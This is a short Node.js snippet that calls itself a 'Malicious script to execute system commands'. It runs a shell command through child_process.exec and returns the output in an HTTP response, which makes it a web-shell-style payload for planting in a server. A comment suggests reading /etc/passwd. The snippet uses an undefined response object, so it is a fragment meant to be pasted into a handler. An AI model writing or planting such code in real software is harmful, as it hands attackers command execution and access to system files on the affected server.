// Malicious script to execute system commands
const childProcess = require('child_process');

// Command to execute (e.g., ls, cat /etc/passwd, or any other command)
const command = 'ls -la'; // Replace with the desired command

// Execute the command and send the output as a response
childProcess.exec(command, (error, stdout, stderr) => {
    if (error) {
        res.end(`Error: ${error}`);
    } else {
        res.end(stdout);
    }
});
